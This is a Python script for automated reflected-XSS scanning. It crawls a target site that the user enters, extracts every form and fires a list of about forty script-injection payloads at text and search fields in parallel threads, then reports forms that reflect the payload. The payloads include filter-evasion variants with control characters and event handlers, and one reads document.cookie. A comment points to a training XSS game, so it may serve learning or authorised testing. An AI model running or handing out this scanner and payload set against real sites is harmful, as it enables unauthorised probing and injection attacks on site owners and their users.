import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urlparse, urljoin
import threading
from itertools import repeat
from concurrent.futures import ThreadPoolExecutor
from SSS import webCrawler

def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):

    details = {}
    
    action = form.attrs.get("action").lower()
   
    method = form.attrs.get("method", "get").lower()
   
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
   
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        # replace all text and search values with `value`
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None, 
            # then add them to the data of form submission
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # GET request
        return requests.get(target_url, params=data)

def scan_xss(u, js_script):
    """
    Given a `url`, it prints all XSS vulnerable forms and 
    returns True if any is vulnerable, False otherwise
    """
    # get all the forms from the URL
    
    forms = get_all_forms(u)
    print(f"[+] Detected {len(forms)} forms on {u}.")
    # returning value
    is_vulnerable = False
    # iterate over all forms
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, u, js_script).content.decode()
        # print(content)
        # print(content.decode())
        if js_script in content:
            print(f"[+] XSS Detected on {u}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
            # won't break because we want to print available vulnerable forms
    return is_vulnerable

url=input("ENTER THE url: ")
g=webCrawler(url, 0)
if __name__ == "__main__":
    a = []
    g.crawl(url, 1000, a)
    print("[+] Total Internal links:", len(g.internal_urls))
    print("[+] Total External links:", len(g.external_urls))
    print("[+] Total URLs:", len(g.external_urls) + len(g.internal_urls))

    # print(a)
    

    
    payloads = ['<script\x20type="text/javascript">javascript:alert(1);</script>', 
    '<script\x3Etype="text/javascript">javascript:alert(1);</script>', 
    '<script\x0Dtype="text/javascript">javascript:alert(1);</script>', 
    '<script\x09type="text/javascript">javascript:alert(1);</script>', 
    '<script\x0Ctype="text/javascript">javascript:alert(1);</script>', 
    '<script\x2Ftype="text/javascript">javascript:alert(1);</script>', 
    '<script\x0Atype="text/javascript">javascript:alert(1);</script>',
    """'`"><\x3Cscript>javascript:alert(1)</script>""",
    """'`"><\x00script>javascript:alert(1)</script>""" 
    '''"'>-->*/</noscript></ti tle><script>alert()</script>''',
    '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">', 
    '<details open ontoggle="alert()">', 
    '\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>', 
    '<iframe srcdoc="<svg onload=alert(4);>">', 
    '<img src=1 href=1 onerror="javascript:alert(1)"></img>', 
    '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>', 
    '<video src=1 href=1 onerror="javascript:alert(1)"></video>', 
    '<body src=1 href=1 onerror="javascript:alert(1)"></body>', 
    '<image src=1 href=1 onerror="javascript:alert(1)"></image>', 
    '<object src=1 href=1 onerror="javascript:alert(1)"></object>', 
    '<script src=1 href=1 onerror="javascript:alert(1)"></script>', 
    '<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>', 
    '<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>', 
    '<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>', 
    '<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>', 
    '<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
    '<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>', 
    '<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>', 
    '<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>', 
    '<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>', 
    '<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>', 
    '<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>', 
    '<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>', 
    '<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>', 
    '<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>', 
    '<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>', 
    '<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>', 
    '<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>', 
    '<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>' ]


# initializing string 
# test_str = input("Enter the filtered charachter : ")
  
# # printing original list
# print("The original list is : " + str(payloads))
  
# # Remove List elements containing String character
# # Using loop
# res = []
# for sub in payloads:
#     flag = 0
#     for ele in sub:
#         if ele in test_str:
#             flag = 1
#     if not flag:
#         res.append(sub)
  
# # printing result 
# print("The list after removal : " + str(res))
for url in a:
    with ThreadPoolExecutor() as executer:
        result = executer.map(scan_xss, repeat(url), payloads)
        print([x for x in result])














# https://xss-game.appspot.com/level1/frame